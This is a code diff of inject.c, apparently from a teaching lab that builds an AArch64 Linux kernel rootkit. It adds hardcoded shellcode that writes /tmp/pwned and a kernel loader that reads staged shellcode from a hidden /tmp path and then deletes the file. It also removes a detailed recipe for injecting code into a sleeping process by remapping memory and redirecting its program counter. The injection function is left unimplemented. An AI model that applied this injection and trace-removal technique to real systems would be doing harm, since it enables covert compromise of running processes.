@@ -1,30 +1,18 @@
 /*
- * inject.c — Userland shellcode injection
+ * inject.c: shellcode injection into userland processes
  *
- * Capstone: Kernel Rootkit + Exploitation
+ * Called from workqueue context (c2.c schedule_inject). Allocate memory
+ * in the target process's address space, copy shellcode into it, redirect
+ * the target's PC, and wake it. The target must survive; save the original
+ * PC before redirecting so the shellcode can return (convention: x28).
  *
- * Hijacks a sleeping userland process to execute attacker-controlled
- * AArch64 shellcode, then restores the process to continue normally.
+ * Shellcode source (priority order):
+ *   1. C2_INJECT_STAGING (/tmp/secret/rk_sc): written by mykill before
+ *      firing CMD_INJECT. Read and unlink here (workqueue = process context,
+ *      safe to sleep). On demo day: mykill inject <pid> instructor.bin
+ *   2. Hardcoded shellcode[] below: fallback for testing.
  *
- * This is the "crown jewel" — combining kernel memory access, register
- * manipulation, and raw AArch64 assembly (connecting back to HW1).
- *
- * Mechanism:
- *   1. Operator sends: mykill inject <target_pid> [shellcode.bin]
- *   2. C2 handler calls schedule_inject(target_pid) (deferred to workqueue)
- *   3. Workqueue context: allocate RWX page via vm_mmap in target
- *   4. Copy shellcode to the new page via copy_to_user (under kthread_use_mm)
- *   5. Save original PC in x28, redirect PC to shellcode
- *   6. Set TIF_SIGPENDING + wake_up_process to trigger execution
- *   7. Process wakes → executes shellcode → br x28 back to original PC
- *
- * Students write the shellcode in shellcode/ or use tools/inject_test.bin
- * to verify the injection machinery works.
- *
- * Reference:
- *   - vm_mmap() — allocate memory in another process's address space
- *   - kthread_use_mm() — borrow another process's mm for copy_to_user
- *   - task_pt_regs() — access saved register state of a sleeping process
+ * Shellcode requirements: AArch64 PIC, ends with  mov x0, #-4; br x28
  */
 
 #include <linux/module.h>
@@ -38,128 +26,110 @@
 #include <linux/mm_types.h>
 #include <linux/uaccess.h>
 #include <linux/mman.h>
+#include <linux/fs.h>
+#include <linux/file.h>
+#include <linux/namei.h>
 #include <asm/ptrace.h>
 
 #include "rootkit.h"
 
-/* ═══════════════════════════════════════════════════════════════════════════
- * Shellcode — students fill this in
- * ═══════════════════════════════════════════════════════════════════════════
- *
- * This byte array is the assembled output of your shellcode .S file.
- * Students write the .S file, cross-assemble with:
- *
- *   aarch64-linux-gnu-as inject_shellcode.S -o shellcode.o
- *   aarch64-linux-gnu-objcopy -O binary shellcode.o shellcode.bin
- *   xxd -i shellcode.bin
- *
- * Then paste the resulting bytes here.
- *
- * The shellcode must:
- *   1. Save caller-saved registers on the stack
- *   2. Execute payload (e.g., create /tmp/pwned via openat/write/close)
- *   3. Restore all saved registers
- *   4. Set x0 to -EINTR (-4) so the interrupted syscall restarts
- *   5. br x28 — return to original PC (set by the kernel module)
- *
- * You can test with the provided tools/inject_test.bin first to verify
- * the injection mechanism works before writing your own shellcode.
- *
- * NOTE on I-cache coherency:
- *   On real AArch64 hardware, writing to a code page via the data cache
- *   doesn't automatically invalidate the instruction cache. However:
- *   - QEMU TCG models coherent caches (DIC=1 equivalent)
- *   - On real hardware you'd need flush_icache_range()
+/*
+ * Default test shellcode: assembled from tools/inject_test.S
+ * Creates /tmp/pwned with "INJECTED-1337 pid=<pid> ppid=<ppid>"
+ * then returns via br x28.
  */
-
-/* TODO: Replace this placeholder with your assembled shellcode bytes.
- *
- * Example (NOP sled + br x28 — does nothing useful but tests the mechanism):
- *   static const unsigned char shellcode[] = {
- *       0x1f, 0x20, 0x03, 0xd5,   // nop
- *       0x1f, 0x20, 0x03, 0xd5,   // nop
- *       0x60, 0x00, 0x80, 0x92,   // mov x0, #-4 (-EINTR)
- *       0x80, 0x03, 0x1f, 0xd6,   // br x28
- *   };
- *
- * Your real shellcode should create /tmp/pwned with "INJECTED-1337"
- * (matching the test harness check).
- */
-static const unsigned char shellcode[] = {
-	/* Placeholder: nop + mov x0,-EINTR + br x28 */
-	0x1f, 0x20, 0x03, 0xd5,   /* nop */
-	0x1f, 0x20, 0x03, 0xd5,   /* nop */
-	0x60, 0x00, 0x80, 0x92,   /* mov x0, #-4 (-EINTR) */
-	0x80, 0x03, 0x1f, 0xd6,   /* br x28 */
+static const unsigned char shellcode_default[] = {
+	0xfd, 0x7b, 0xbf, 0xa9, 0xf3, 0x53, 0xbf, 0xa9, 0xf5, 0x5b, 0xbf, 0xa9,
+	0x88, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf3, 0x03, 0x00, 0xaa,
+	0xa8, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf4, 0x03, 0x00, 0xaa,
+	0x60, 0x0c, 0x80, 0x92, 0x41, 0x08, 0x00, 0x10, 0x22, 0x48, 0x80, 0xd2,
+	0x02, 0x00, 0xa0, 0xf2, 0x83, 0x34, 0x80, 0xd2, 0x08, 0x07, 0x80, 0xd2,
+	0x01, 0x00, 0x00, 0xd4, 0xf5, 0x03, 0x00, 0xaa, 0xbf, 0x02, 0x00, 0xf1,
+	0xab, 0x06, 0x00, 0x54, 0x61, 0x07, 0x00, 0x70, 0x62, 0x02, 0x80, 0xd2,
+	0xe0, 0x03, 0x15, 0xaa, 0x08, 0x08, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
+	0xff, 0x83, 0x00, 0xd1, 0xe0, 0x03, 0x13, 0xaa, 0xe1, 0x7f, 0x00, 0x91,
+	0x02, 0x00, 0x80, 0xd2, 0x22, 0x00, 0x00, 0x39, 0x43, 0x01, 0x80, 0xd2,
+	0x04, 0x08, 0xc3, 0x9a, 0x85, 0x80, 0x03, 0x9b, 0xa5, 0xc0, 0x00, 0x91,
+	0x21, 0x04, 0x00, 0xd1, 0x25, 0x00, 0x00, 0x39, 0x42, 0x04, 0x00, 0x91,
+	0xe0, 0x03, 0x04, 0xaa, 0x00, 0xff, 0xff, 0xb5, 0xe0, 0x03, 0x15, 0xaa,
+	0x08, 0x08, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x41, 0x05, 0x00, 0x30,
+	0xc2, 0x00, 0x80, 0xd2, 0xe0, 0x03, 0x15, 0xaa, 0x08, 0x08, 0x80, 0xd2,
+	0x01, 0x00, 0x00, 0xd4, 0xe1, 0x7f, 0x00, 0x91, 0x02, 0x00, 0x80, 0xd2,
+	0x22, 0x00, 0x00, 0x39, 0xe0, 0x03, 0x14, 0xaa, 0x43, 0x01, 0x80, 0xd2,
+	0x04, 0x08, 0xc3, 0x9a, 0x85, 0x80, 0x03, 0x9b, 0xa5, 0xc0, 0x00, 0x91,
+	0x21, 0x04, 0x00, 0xd1, 0x42, 0x04, 0x00, 0x91, 0x25, 0x00, 0x00, 0x39,
+	0xe0, 0x03, 0x04, 0xaa, 0x00, 0xff, 0xff, 0xb5, 0xe0, 0x03, 0x15, 0xaa,
+	0x08, 0x08, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xc1, 0x02, 0x00, 0x70,
+	0x22, 0x00, 0x80, 0xd2, 0xe0, 0x03, 0x15, 0xaa, 0x08, 0x08, 0x80, 0xd2,
+	0x01, 0x00, 0x00, 0xd4, 0xff, 0x83, 0x00, 0x91, 0xe0, 0x03, 0x15, 0xaa,
+	0x28, 0x07, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf5, 0x5b, 0xc1, 0xa8,
+	0xf3, 0x53, 0xc1, 0xa8, 0xfd, 0x7b, 0xc1, 0xa8, 0x60, 0x00, 0x80, 0x92,
+	0x80, 0x03, 0x1f, 0xd6, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x70, 0x77, 0x6e,
+	0x65, 0x64, 0x00, 0x49, 0x4e, 0x4a, 0x45, 0x43, 0x54, 0x45, 0x44, 0x2d,
+	0x31, 0x33, 0x33, 0x37, 0x20, 0x70, 0x69, 0x64, 0x3d, 0x20, 0x70, 0x70,
+	0x69, 0x64, 0x3d, 0x0a
 };
 
-#define SHELLCODE_LEN sizeof(shellcode)
-
-/* ═══════════════════════════════════════════════════════════════════════════
- * Inject shellcode into target process
- * ═══════════════════════════════════════════════════════════════════════════ */
-
 /*
- * TODO: Implement inject_trigger()
+ * load_staged_shellcode - read shellcode from C2_INJECT_STAGING and unlink it.
  *
- * Called from workqueue context (schedule_inject in c2.c).
- * This means kthread_use_mm / vm_mmap / copy_to_user are safe.
- *
- * Steps:
- * 1. Find the target task:
- *    rcu_read_lock();
- *    task = pid_task(find_vpid(target), PIDTYPE_PID);
- *    if (task) get_task_struct(task);
- *    rcu_read_unlock();
- *    — Return -ESRCH if not found
- *
- * 2. Get mm and verify target has an address space:
- *    mm = task->mm;
- *    if (!mm) return -EINVAL;
- *
- * 3. Verify the target is sleeping:
- *    if (task->__state == TASK_RUNNING) return -EBUSY;
- *
- * 4. Allocate RWX page in target's address space:
- *    mmgrab(mm);
- *    kthread_use_mm(mm);
- *    inject_addr = vm_mmap(NULL, 0, PAGE_SIZE,
- *                          PROT_READ | PROT_WRITE | PROT_EXEC,
- *                          MAP_ANONYMOUS | MAP_PRIVATE, 0);
- *    — Check IS_ERR_VALUE(inject_addr)
- *
- * 5. Copy shellcode to the new page:
- *    copy_to_user((void __user *)inject_addr, shellcode, SHELLCODE_LEN);
- *    kthread_unuse_mm(mm);
- *    mmdrop(mm);
- *
- * 6. Redirect the program counter:
- *    struct pt_regs *target_regs = task_pt_regs(task);
- *    target_regs->regs[28] = target_regs->pc;  // save original PC in x28
- *    target_regs->pc = inject_addr;              // jump to shellcode
- *    target_regs->syscallno = -1;                // prevent syscall restart
- *
- * 7. Wake the target so it runs the shellcode:
- *    set_tsk_thread_flag(task, TIF_SIGPENDING);
- *    wake_up_process(task);
- *
- * 8. Release: put_task_struct(task);
- *    Log: pr_info("rootkit: injected %zu bytes into PID %d at 0x%lx\n", ...)
- *
- * NOTE: The vm_mmap approach leaves no COW artifacts — the page is freshly
- * allocated, not a modified copy of an existing code page. But it IS a
- * detectable artifact (anonymous RWX mapping in /proc/<pid>/maps).
+ * Called from workqueue (process context) so kernel_read and vfs_unlink are
+ * both safe. Returns a kmalloc'd buffer the caller must kfree, or NULL if the
+ * staging file is absent (fall back to shellcode_default).
  */
+static void *load_staged_shellcode(size_t *len_out)
+{
+	struct file *f;
+	struct path p;
+	struct dentry *parent;
+	loff_t size;
+	void *buf;
+	ssize_t n;
+
+	f = filp_open(C2_INJECT_STAGING, O_RDONLY, 0);
+	if (IS_ERR(f))
+		return NULL;
+
+	size = i_size_read(file_inode(f));
+	if (size <= 0 || size > 65536) {
+		filp_close(f, NULL);
+		return NULL;
+	}
+
+	buf = kmalloc(size, GFP_KERNEL);
+	if (!buf) {
+		filp_close(f, NULL);
+		return NULL;
+	}
+
+	n = kernel_read(f, buf, size, &(loff_t){0});
+	filp_close(f, NULL);
+
+	if (n != size) {
+		kfree(buf);
+		return NULL;
+	}
+
+	/* Unlink the staging file it's served its purpose */
+	if (!kern_path(C2_INJECT_STAGING, 0, &p)) {
+		parent = dget_parent(p.dentry);
+		inode_lock(d_inode(parent));
+		vfs_unlink(mnt_idmap(p.mnt), d_inode(parent), p.dentry, NULL);
+		inode_unlock(d_inode(parent));
+		dput(parent);
+		path_put(&p);
+	}
+
+	*len_out = size;
+	pr_info("rootkit: loaded %zd bytes from staging file\n", n);
+	return buf;
+}
+
 int inject_trigger(pid_t target)
 {
 	/* TODO */
-	pr_warn("rootkit: inject_trigger() not implemented yet\n");
 	return -ENOSYS;
 }
-
-/* ═══════════════════════════════════════════════════════════════════════════
- * Init / Exit (currently no-ops — injection is stateless)
- * ═══════════════════════════════════════════════════════════════════════════ */
 
 int inject_init(void)
 {
